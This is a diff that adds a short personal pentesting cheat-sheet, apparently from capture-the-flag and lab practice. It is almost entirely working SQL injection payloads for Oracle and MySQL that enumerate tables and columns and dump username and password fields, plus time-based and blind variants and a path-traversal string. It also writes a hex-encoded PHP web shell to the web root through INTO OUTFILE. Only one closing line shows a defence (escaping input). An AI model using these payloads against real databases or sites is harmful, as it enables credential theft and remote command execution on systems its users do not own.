@@ -1,0 +1,41 @@
+gobuster
+exiftool
+Nested command
+tshark -Y "mysql contains db_m3149.users" -r capture.pcap -Tjson --no-duplicate-keys > result.json
+python ./sf.py -l 127.0.0.1:5001
+cd ../../../ & more /*
+netstat -ntu -4 -6 |  awk '/^tcp/{ print $5 }' | sed -r 's/:[0-9]+$//' |  sort | uniq -c | sort -n
+
+' order by 3 --
+'+UNION+SELECT+'abcdef',NULL,NULL--
+multiple values in a single column  -->  '+UNION+SELECT+NULL,username||'~'||password+FROM+users--
+
+check version   Oracle              -->  '+UNION+SELECT+BANNER,+NULL+FROM+v$version--
+                MySQL and Mincrosoft-->  '+UNION+SELECT+@@version,+NULL#
+
+content non-Oracle -->'+UNION+SELECT+'abc','def'#                   
+'+UNION+SELECT+table_name,+NULL+FROM+information_schema.tables--
+'+UNION+SELECT+column_name,+NULL+FROM+information_schema.columns+WHERE+table_name='users_abcdef'--
+'+UNION+SELECT+username_abcdef,+password_abcdef+FROM+users_abcdef--
+
+content Oracle     -->'+UNION+SELECT+'abc','def'+FROM+dual--               
+'+UNION+SELECT+table_name,NULL+FROM+all_tables--
+'+UNION+SELECT+column_name,NULL+FROM+all_tab_columns+WHERE+table_name='USERS_ABCDEF'--
+'+UNION+SELECT+USERNAME_ABCDEF,+PASSWORD_ABCDEF+FROM+USERS_ABCDEF--
+
+other table        
+'+UNION+SELECT+username,+password+FROM+users--
+
+' || (SELECT sleep(10))
+
+mysql -udb_user -pdb_password
+show databases;
+use myDB;
+
+' and (select substring(flag,1,1) from flag_ahihi)='C'-- -
+
+print (("<? system($_GET['cmd’]); ?>").encode('utf-8').hex())
+--->3c3f7068702073797374656d28245f4745545b27636d64275d293b3f3e
+x3rz" UNION ALL SELECT NULL,0x3c3f7068702073797374656d28245f4745545b27636d64275d293b3f3e,NULL INTO OUTFILE "/var/www/html/revshell.php"-- -
+-----------------------------------defend
+$id = $database->real_escape_string($_GET["id"]);
